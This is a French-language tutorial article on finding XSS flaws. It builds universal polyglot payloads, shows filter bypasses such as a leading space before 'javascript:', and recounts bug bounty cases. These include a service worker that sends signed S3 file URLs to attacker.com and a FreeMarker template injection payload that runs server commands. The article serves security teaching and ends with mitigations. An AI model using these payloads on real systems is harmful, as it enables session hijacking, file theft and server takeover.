---
title: "Recherche efficace de failles XSS : De alert() à la RCE | DevSense"
description: "Maîtrisez l'art de trouver et d'exploiter les failles de Cross-Site Scripting (XSS). Apprenez à concevoir des payloads universels, contourner les filtres et élever XSS en RCE."
published: 2026-07-03
faq:
  - question: "Qu'est-ce qui rend une chaîne de test universelle (polyglotte) pour un payload XSS ?"
    answer: "Un payload XSS universel est conçu pour s'exécuter dans plusieurs contextes HTML (attributs, texte brut, scripts ou styles) en fermant les balises/guillemets existants et en insérant une balise active (comme iframe) sans casser le parseur HTML du navigateur."
  - question: "Comment un Service Worker peut-il détourner un bucket S3 pour une attaque XSS ?"
    answer: "Si une application sert les fichiers des utilisateurs depuis un bucket S3 partagé sous le même Origin, un attaquant peut y téléverser un Service Worker malveillant. Une fois enregistré, il intercepte toutes les requêtes futures de fichiers dans son scope, permettant de voler des signatures temporaires et d'exfiltrer des fichiers."
  - question: "Quelle est la différence entre l'injection de modèles côté client et la SSTI ?"
    answer: "L'injection de modèles côté client (comme AngularJS/VueJS) exécute du JavaScript dans le navigateur de la victime via des expressions évaluées côté client. La Server-Side Template Injection (SSTI) exécute du code directement sur le serveur web au sein de moteurs comme FreeMarker ou Twig, menant souvent à une exécution de code à distance (RCE)."
---

# Recherche efficace de failles XSS : De alert() à la RCE

La recherche de failles de sécurité est souvent perçue comme un art secret réservé aux hackers d'élite. Pourtant, les menaces côté client comme le **Cross-Site Scripting (XSS)** suivent une logique rigoureuse. En comprenant comment le navigateur analyse le HTML et en apprenant à construire des payloads universels, tout développeur ou ingénieur QA peut identifier efficacement les bogues XSS.

Dans ce guide, basé sur les présentations Heisenbug et l'expérience réelle du Bug Bounty, nous établirons une méthodologie solide pour détecter le XSS, apprendrons à structurer des payloads avancés et explorerons des cas réels où de simples injections ont conduit à des prises de contrôle de serveurs.

---

## Sommaire

* [Qu'est-ce que le XSS et pourquoi la faille se produit-elle](#what-is-xss)
* [La méthodologie de recherche manuelle](#hunting-methodology)
* [Construction du payload universel (du Level 0 au 1337)](#universal-payloads)
* [Contourner les filtres dans le monde réel](#bypassing-restrictions)
* [Études de cas réels de Bug Bounty](#case-studies)
    * [Contournement d'expressions régulières sur biz.mail.ru](#case-mailru)
    * [Attaque de bucket S3 via Service Worker](#case-s3)
    * [Injection HTML dans un e-mail et FreeMarker RCE](#case-ssti)
* [Mesures de protection & Atténuation](#mitigations)

---

<a id="what-is-xss"></a>
## Qu'est-ce que le XSS et pourquoi la faille se produit-elle

Le **Cross-Site Scripting (XSS)** est une vulnérabilité qui permet à un attaquant d'exécuter du code JavaScript arbitraire dans le navigateur d'une victime, au sein du contexte de sécurité (Origin) du site web cible.

Elle survient lorsqu'une application web accepte des données fournies par l'utilisateur et les insère dans la page HTML générée sans encodage ni assainissement adéquats. Les navigateurs ne peuvent pas distinguer le code original du site des balises injectées. Ils exécutent simplement toutes les balises HTML et tous les codes JavaScript qu'ils rencontrent.

On distingue généralement :
* **Le XSS stocké (Stored XSS) :** Le code malveillant est enregistré dans la base de données (ex. : nom d'utilisateur, commentaire) et affiché ultérieurement à d'autres utilisateurs.
* **Le XSS réfléchi (Reflected XSS) :** Le code malveillant est immédiatement renvoyé dans la réponse du serveur, généralement via un paramètre de l'URL ou le corps d'une requête POST.

---

<a id="hunting-methodology"></a>
## La méthodologie de recherche manuelle

Les scanners automatiques passent souvent à côté des failles logiques et se heurtent aux filtres de sécurité. Une approche manuelle en boîte noire s'avère bien plus fiable :

1. **Injectez une chaîne de test unique** (ex. : `qweqwe`) dans chaque champ de saisie, paramètre URL, en-tête ou formulaire de téléversement.
2. **Examinez le DOM de la page.** Ouvrez les DevTools (`F12`), recherchez votre chaîne (`Ctrl+F`) et observez combien de fois elle apparaît sur la page.
3. **Analysez le contexte de l'injection.** Où la chaîne a-t-elle été insérée ? Dans du texte brut ? Dans un attribut `value` ? Dans un bloc `<script>` ?
4. **Testez les caractères spéciaux** (`' " < > &`) pour voir s'ils sont assainis (convertis en entités HTML comme `&quot;`, `&lt;`, `&gt;`) ou affichés en brut.
5. **Construisez et poussez le payload** en fonction des caractères autorisés.

---

<a id="universal-payloads"></a>
## Construction du payload universel (du Level 0 au 1337)

Plutôt que d'adapter le code à chaque champ manuellement, les chasseurs de bogues utilisent des **payloads universels** conçus pour s'adapter simultanément à plusieurs contextes d'insertion.

### Level 0: Le débutant
`"<script>alert()</script>"`
Cela fonctionne uniquement si le développeur affiche l'entrée directement dans le texte HTML :
```html
<p>Bienvenue, Utilisateur <script>alert()</script> !</p>
```

### Level 1: Sortir des attributs
Si l'entrée tombe dans un attribut de balise, la variante précédente échoue car elle reste entre guillemets :
```html
<input name="search" value="<script>alert()</script>">
```
Nous devons fermer les guillemets et la balise elle-même : `">`
Nouveau payload : `"><script>alert()</script>`
```html
<input name="search" value=""><script>alert()</script>">
```

### Level 2: Sortir des balises de service
Si la chaîne tombe dans des balises telles que `<title>`, `<style>`, `<textarea>` ou `<script>`, le navigateur traite les données comme du texte ou du code JS et ne rend pas les balises HTML.
Il faut d'abord fermer ces balises.
Nouveau payload : `"></title></script><script>alert()</script>`

Et si le développeur a entouré l'attribut de guillemets simples ? Ajoutons `'` au début :
Nouveau payload : `'">></title></script><script>alert()</script>`

### Level 3: Utilisation d'iframe
La balise `<script>` est souvent bloquée par les WAF (Web Application Firewalls). À la place, il est préférable d'utiliser un `<iframe>` avec l'événement `onload` :
Nouveau payload : `'">></title></script><iframe onload='alert()'>`

Le cadre exécute le JavaScript de l'attribut `onload` immédiatement après le rendu, même sans spécifier de source `src`.

### Level 1337: Slashes et polyglottes
Les filtres avancés suppriment les espaces ou recherchent les crochets de fermeture. Nous pouvons les contourner si nous :
* Remplaçons les espaces par des slashes (`/`).
* Permettons au navigateur de fermer la balise lui-même (en enlevant `>`).
* Fermons les éventuels commentaires HTML (`-->`).
* Injectons des expressions de moteurs de modèles côté client comme AngularJS ou VueJS (`{{7*7}}`).

Le payload universel final :
```html
'"/test/></title/></script/></style/-->{{7*7}}<iframe/onload='alert`1``<!--
```

S'il est inséré dans un attribut, cela donne :
```html
<input name="search" value=''"/test/></title/></script/></style/-->{{7*7}}<iframe/onload='alert`1``<!--'>
```
Ici, notre propre attribut `test` est créé avec succès, dont la présence peut être facilement vérifiée avec un script en console :
```javascript
if (document.querySelectorAll('*[test]').length > 0) {
    console.log("XSS détecté via injection d'attribut !");
}
```

---

<a id="bypassing-restrictions"></a>
## Contourner les filtres dans le monde réel

### 1. Balises non fermées contre expressions régulières
Si un filtre supprime toutes les structures de type `<...>`, vous pouvez envoyer une balise non fermée :
```html
<iframe/onload='alert()'
```
Le navigateur analyse la chaîne, rencontre la fin du document, ajoute le crochet de fermeture de lui-même et exécute le script.

### 2. Espaces dans les schémas URL
Lors de la vérification de paramètres de redirection (ex. : `returnUrl`), les développeurs vérifient souvent si la chaîne commence par le mot `javascript:`.
* **Contournement par espace :** L'insertion d'un espace ou d'une tabulation avant le schéma (`%20javascript:alert()`) contourne la simple vérification `startsWith`, tandis que le navigateur considère toujours le schéma comme valide et exécute le code.
* **Syntaxe URL :** Une construction du type `javascript://google.com/%0aalert()`. Le double slash transforme le texte suivant en commentaire JS, et `%0a` (saut de ligne) le termine pour exécuter `alert()`.

---

<a id="case-studies"></a>
## Études de cas réels de Bug Bounty

<a id="case-mailru"></a>
### Cas 1: Contournement d'expressions régulières sur biz.mail.ru
Sur un projet de Mail.ru, une erreur serveur 500 redirigeait l'utilisateur vers une page d'erreur avec un paramètre `from`. Le bouton « Actualiser » menait à cette adresse.
* La tentative d'injecter `javascript:alert()` était remplacée par `https://`.
* L'injection de `%20javascript:alert()` (avec un espace au début) a contourné l'expression régulière. Le lien malveillant a été enregistré et exécuté lors du clic sur le bouton « Actualiser ».

<a id="case-s3"></a>
### Cas 2: Attaque de bucket S3 via Service Worker
Dans une application CRM privée, les utilisateurs téléversaient des documents stockés dans un bucket Amazon S3. 
À l'ouverture d'un fichier, le serveur générait une signature temporaire et redirigeait vers le domaine S3.
* Tous les fichiers des utilisateurs étaient hébergés sur le même sous-domaine S3.
* L'attaquant a téléversé un fichier HTML contenant un payload XSS qui exécutait du JavaScript à l'ouverture.
* Pour voler les fichiers des autres utilisateurs, le pirate a téléversé un `serviceworker.js` malveillant :
```javascript
// serviceworker.js
self.addEventListener('fetch', function(event) {
    event.respondWith(
        new Response("<iframe src='https://attacker.com/log?url=" + encodeURIComponent(event.request.url) + "'></iframe>", {
            headers: { 'Content-Type': 'text/html' }
        })
    );
});
```
* Un lien vers le fichier `exploit.html` a été envoyé à la victime, ce qui a enregistré le Service Worker sur toute la racine du bucket S3.
* Désormais, lorsque la victime tentait d'ouvrir un autre document confidentiel du CRM, le Service Worker interceptait la requête et transmettait le lien temporaire signé au serveur de l'attaquant.

<a id="case-ssti"></a>
### Cas 3: Injection HTML dans un e-mail et FreeMarker RCE
Une plateforme marketing permettait de personnaliser des modèles d'e-mails HTML.
* L'attaquant a inséré les expressions `${7*7}` et `{{7*7}}` dans le modèle d'e-mail.
* Lors de la prévisualisation de l'e-mail, le serveur a calculé l'expression et a affiché `49`, révélant une vulnérabilité **SSTI (Server-Side Template Injection)**.
* Le moteur de rendu était le moteur Java **FreeMarker**. En utilisant ses méthodes d'exécution de commandes intégrées, l'injection a été élevée à l'exécution de code sur le serveur (**RCE**) :
```html
[#assign cmd = 'freemarker.template.utility.Execute'?new()]
${cmd('id')}
```
La commande `id` a été exécutée sur le système du serveur et le résultat (les privilèges root) s'est affiché directement dans la fenêtre de prévisualisation de l'e-mail.

---

<a id="mitigations"></a>
## Mesures de protection & Atténuation

1. **Ne faites jamais confiance aux entrées de l'utilisateur :** Validez tous les paramètres, en-têtes et noms de fichiers.
2. **Encodage de sortie adapté au contexte :** Appliquez l'échappement des caractères spéciaux selon le lieu d'affichage :
    * Dans le corps HTML : utilisez `htmlspecialchars()`.
    * Dans le contexte JS : encodez via `json_encode()`.
    * Dans les liens : autorisez uniquement les protocoles `http`/`https`.
3. **Mettez en place une Content Security Policy (CSP) :** Les en-têtes stricts de CSP interdisent l'exécution de scripts en ligne et restreignent les sources de chargement des ressources.
4. **Isolez les fichiers des utilisateurs :** Hébergez le contenu téléversé sur un domaine totalement distinct (ex. : `my-app-files.com`), exempt de cookies de session et n'ayant pas accès à l'API principale.
5. **Sécurisez les moteurs de modèles :** Désactivez l'accès aux API système et aux bacs à sable (sandboxes) lors de l'exécution de modèles utilisateur dans FreeMarker, Twig ou Blade.
